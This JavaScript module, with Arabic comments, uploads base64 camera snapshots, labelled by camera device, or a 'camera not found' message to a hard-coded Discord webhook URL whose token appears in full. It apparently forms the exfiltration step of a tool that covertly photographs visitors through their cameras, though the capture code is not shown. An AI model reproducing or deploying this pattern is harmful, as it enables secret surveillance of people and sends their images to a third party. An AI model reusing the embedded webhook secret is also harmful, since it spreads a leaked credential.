// discordWebhook.js
export async function sendToDiscord(content) {
    const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";  // ضع هنا رابط الـWebhook الخاص بك
    const formData = new FormData();

    if (typeof content === "string") {
        // إذا كانت المحتويات نصًا (مثل رسالة "camera not found")
        formData.append("content", content);
    } else if (Array.isArray(content)) {
        // إذا كانت المحتويات صورًا، تحويل الصور إلى Blob وإضافتها إلى الـ FormData
        content.forEach((imageData, index) => {
            const blob = dataURItoBlob(imageData.image);
            formData.append("file", blob, `image_${imageData.deviceLabel}.png`);
        });
    }

    try {
        console.log("إرسال البيانات إلى Webhook...");
        const response = await fetch(webhookUrl, {
            method: "POST",
            body: formData
        });

        if (response.ok) {
            console.log("تم إرسال البيانات بنجاح!");
        } else {
            const errorText = await response.text();
            console.error("فشل في إرسال البيانات إلى Discord:", errorText);
        }
    } catch (error) {
        console.error("حدث خطأ أثناء إرسال البيانات.", error);
    }
}

// تحويل البيانات من base64 إلى Blob
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: "image/png" });
}
